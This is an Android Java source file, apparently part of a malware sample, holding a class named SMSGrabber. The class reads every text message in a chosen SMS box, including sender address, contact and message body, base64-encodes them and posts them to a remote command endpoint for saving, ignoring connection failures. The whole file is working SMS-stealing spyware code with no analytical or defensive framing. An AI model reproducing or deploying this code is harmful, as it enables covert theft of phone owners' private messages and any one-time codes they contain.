package sx.jolly.grabbers;

import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import sx.jolly.exceptions.NoConnectionException;
import sx.jolly.utils.Post;
import sx.jolly.utils.Url;
import sx.jolly.utils.Utils;

public class SMSGrabber {
    Context context = null;
    Cursor cursor = null;

    public SMSGrabber(Context context) {
        this.context = context;
    }

    public void grab(String box) {
        Uri queryUri = Uri.parse("content://sms/" + box);
        this.cursor = this.context.getContentResolver().query(queryUri, new String[]{"_id", "thread_id", "address", "person", "date", "body", "type"}, null, null, null);
        if (this.cursor.moveToFirst()) {
            int index_Address = this.cursor.getColumnIndex("address");
            int index_Person = this.cursor.getColumnIndex("person");
            int index_Body = this.cursor.getColumnIndex("body");
            int index_Date = this.cursor.getColumnIndex("date");
            int index_Type = this.cursor.getColumnIndex("type");
            String body = "";
            do {
                String strAddress = this.cursor.getString(index_Address);
                int intPerson = this.cursor.getInt(index_Person);
                String strbody = this.cursor.getString(index_Body);
                long longDate = this.cursor.getLong(index_Date);
                int int_Type = this.cursor.getInt(index_Type);
                String base = Utils.base64encode("address=" + strAddress + "&person=" + Integer.toString(intPerson) + "&body=" + strbody + ";");
                if (base != null) {
                    body = new StringBuilder(String.valueOf(body)).append(base).toString();
                }
            } while (this.cursor.moveToNext());
            if (!this.cursor.isClosed()) {
                this.cursor.close();
                this.cursor = null;
            }
            Url url = new Url(Utils.CMD_SAVESMSLOGS, true, false, this.context);
            url.addQueryString("box/" + box + "/");
            try {
                new Post(url, body).post();
                Utils.slog(SMSGrabber.class, "sms saved");
            } catch (NoConnectionException e) {
            }
        }
    }
}
